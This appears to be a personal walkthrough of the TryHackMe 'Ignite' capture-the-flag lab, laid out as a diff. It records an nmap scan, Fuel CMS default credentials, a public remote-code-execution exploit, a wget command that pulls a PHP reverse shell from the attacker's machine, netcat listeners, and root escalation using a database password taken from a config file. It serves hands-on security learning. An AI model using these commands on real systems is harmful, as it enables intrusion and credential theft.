@@ -1,0 +1,125 @@
+NMAP Scan:
+
+└─$ nmap -T4 -vvv 10.10.38.242
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-07 11:40 PDT
+Initiating Ping Scan at 11:40
+Scanning 10.10.38.242 [2 ports]
+Completed Ping Scan at 11:40, 0.17s elapsed (1 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 11:40
+Completed Parallel DNS resolution of 1 host. at 11:40, 0.08s elapsed
+DNS resolution of 1 IPs took 0.08s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
+Initiating Connect Scan at 11:40
+Scanning 10.10.38.242 [1000 ports]
+Discovered open port 80/tcp on 10.10.38.242
+Completed Connect Scan at 11:40, 9.27s elapsed (1000 total ports)
+Nmap scan report for 10.10.38.242
+Host is up, received syn-ack (0.16s latency).
+Scanned at 2022-06-07 11:40:19 PDT for 9s
+Not shown: 999 closed tcp ports (conn-refused)
+PORT   STATE SERVICE REASON
+80/tcp open  http    syn-ack
+
+
+
+Fuel CMS Page
+http://10.10.38.242
+homepage lets us know: admin:admin default credentials
+
+
+Robots.txt
+/fuel/
+
+
+Dirbuster:
+
+/home
+/fuel
+/index
+/asset
+
+Googled FuelCMS Exploit
+Found: https://www.exploit-db.com/exploits/47138
+
+Downloaded exploit. 
+
+Changed URL to attack box. CHMOD +x.
+
+sudo python2 fuelexploit.py 
+met with "CMD:"
+
+next, I downloaded .php rev shell from pentest monkey github.
+
+nano php-reverse-shell.php
+
+changed IP to: my hostIP
+left port as : 1234
+
+from /Desktop/THM/Ignite/php-reverse-shell
+sudo python3 -m http.server
+running on port 8000
+
+new tab: nc -lvnp 1234
+
+
+python2 fuelexploit.py
+cmd:wget http://<host IP:8000/php-reverse.shell.php>
+
+set up listener:
+nc -lvnp 1234
+
+head back to mainpage http://<target IP>/php-reverse-shell.php
+
+user flag 
+home/www-data/flag.txt
+
+6470e394cbf6dab6a91682cc8585****
+
+Now for Privesc!!
+
+homepage tells us we can change the database configurations in fuel/application/config/database.php
+
+navigate to
+
+var/www/html/fuel/application/config
+
+cat database.php
+
+"$db['default'] = array(
+        'dsn'   => '',
+        'hostname' => 'localhost',
+        'username' => 'root',
+        'password' => 'mememe',
+        'database' => 'fuel_schema',
+        'dbdriver' => 'mysqli',
+        'dbprefix' => '',
+        'pconnect' => FALSE,
+        'db_debug' => (ENVIRONMENT !== 'production'),
+        'cache_on' => FALSE,
+        'cachedir' => '',
+        'char_set' => 'utf8',
+        'dbcollat' => 'utf8_general_ci',
+        'swap_pre' => '',
+        'encrypt' => FALSE,
+        'compress' => FALSE,
+        'stricton' => FALSE,
+        'failover' => array(),
+        'save_queries' => TRUE"
+
+su root
+Password:mememe
+root@ubuntu:/# cd root
+cd root
+root@ubuntu:~# ls
+ls
+root.txt
+root@ubuntu:~# cat root.txt
+cat root.txt
+b9bbcb33e11b80be759c4e844862****
+
+
+
+
+
+
+
+
